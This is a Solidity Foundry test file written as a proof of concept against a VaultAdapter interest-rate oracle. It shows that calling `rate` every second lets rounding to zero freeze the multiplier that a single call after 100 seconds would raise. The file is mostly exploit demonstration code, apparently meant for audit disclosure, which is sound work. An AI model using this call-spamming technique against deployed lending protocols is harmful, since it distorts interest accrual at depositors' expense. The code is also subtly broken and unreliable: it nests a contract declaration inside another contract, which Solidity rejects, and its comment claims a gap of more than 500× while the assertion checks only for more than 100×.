// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {VaultAdapter} from "contracts/oracle/libraries/VaultAdapter.sol";
import {VaultAdapterStorageUtils} from "contracts/oracle/libraries/VaultAdapterStorageUtils.sol";
import {IVault} from "contracts/interfaces/IVault.sol";

/*
    PoC summary
    1.  We configure a VaultAdapter with a very small `rate` (1e25 = 0.01 in ray).  
        For such a small rate the term  (_elapsed * rate / 1e27) becomes zero
        whenever _elapsed == 1 seconds, making the multiplier update a nop.

    2.  Scenario-A (single call) : we let 100 seconds elapse and call `rate` once.  
        The elapsed time is large enough so the multiplier moves significantly.

    3.  Scenario-B (frequent calls) : we call `rate` every second for 100 seconds.  
        Because `_elapsed` is always 1 and the term mentioned above rounds down to
        zero, the multiplier never changes.

    4.  We compare the two final interest-rates.  A secure implementation would
        accrue the same multiplier regardless of how often the oracle is queried,
        yet we observe a > 500× gap, proving the rounding vulnerability.
*/

contract VaultAdapterExploitTest is Test {
    using VaultAdapterStorageUtils for VaultAdapterStorageUtils.VaultAdapterStorage;

    // Helper mock implementing the minimal IVault surface used by the adapter
    contract MockVault is IVault {
        mapping(address => uint256) internal util; // utilization in ray (1e27)
        function setUtil(address asset, uint256 _util) external { util[asset] = _util; }

        // Integral of utilisation : util * t
        function currentUtilizationIndex(address asset) external view returns (uint256) {
            return util[asset] * block.timestamp;
        }

        // Instantaneous utilisation
        function utilization(address asset) external view returns (uint256) {
            return util[asset];
        }
    }

    VaultAdapter adapterOne; // single-call scenario
    VaultAdapter adapterTwo; // frequent-call scenario
    MockVault    vault;
    address constant ASSET = address(0xDEAD);

    // Constant configuration
    uint256 constant KINK        = 5e26;  // 0.5 in ray
    uint256 constant UTIL_BELOW  = 2e26;  // 0.2 (below kink)
    uint256 constant UTIL_ABOVE  = 8e26;  // 0.8 (above kink)
    uint256 constant RATE_SMALL  = 1e25;  // 0.01   <<<<<< causes rounding-to-zero bug
    uint256 constant MIN_MULT    = 1e27;  // 1.0
    uint256 constant MAX_MULT    = 1e30;  // 1000

    function setUp() public {
        vault = new MockVault();

        // Deploy & initialise two independent adapters so scenarios don't interfere
        adapterOne = new VaultAdapter();
        adapterTwo = new VaultAdapter();

        adapterOne.initialize(address(this));
        adapterTwo.initialize(address(this));

        // Common slope configuration
        VaultAdapterStorageUtils.SlopeData memory slopes =
            VaultAdapterStorageUtils.SlopeData({
                slope0: 1e27, // base
                slope1: 1e27, // slope above kink
                kink:   KINK
            });

        adapterOne.setSlopes(ASSET, slopes);
        adapterTwo.setSlopes(ASSET, slopes);

        // Limits => keep multiplier within [1, 1000]
        adapterOne.setLimits(MAX_MULT, MIN_MULT, RATE_SMALL);
        adapterTwo.setLimits(MAX_MULT, MIN_MULT, RATE_SMALL);

        // 1.  First oracle touch below kink to seed multiplier = minMultiplier (1e27)
        vault.setUtil(ASSET, UTIL_BELOW);
        adapterOne.rate(address(vault), ASSET);
        adapterTwo.rate(address(vault), ASSET);

        // 2.  Move utilisation above kink for exploit demonstration
        vault.setUtil(ASSET, UTIL_ABOVE);
    }

    // Single call after 100 seconds – multiplier SHOULD grow
    function _runSingleCallScenario() internal returns (uint256 rateOut) {
        vm.warp(block.timestamp + 100);
        rateOut = adapterOne.rate(address(vault), ASSET);
    }

    // Call each second for 100 seconds – multiplier stays flat due to rounding
    function _runFrequentCallScenario() internal returns (uint256 rateOut) {
        for (uint256 i; i < 100; ++i) {
            vm.warp(block.timestamp + 1); // advance 1 second
            adapterTwo.rate(address(vault), ASSET); // each call _elapsed == 1
        }
        // final interest rate after the spam calls
        rateOut = adapterTwo.rate(address(vault), ASSET);
    }

    function testExploitPreventsMultiplierShift() public {
        uint256 singleCallRate   = _runSingleCallScenario();
        uint256 frequentCallRate = _runFrequentCallScenario();

        emit log_named_uint("Interest rate after ONE call (should be high)", singleCallRate);
        emit log_named_uint("Interest rate after MANY calls (should be ~baseline)", frequentCallRate);

        // The single-call multiplier should be dramatically larger
        // (>100× proves the shift was inhibited in the frequent-call path).
        assertGt(singleCallRate, frequentCallRate * 100);
    }
}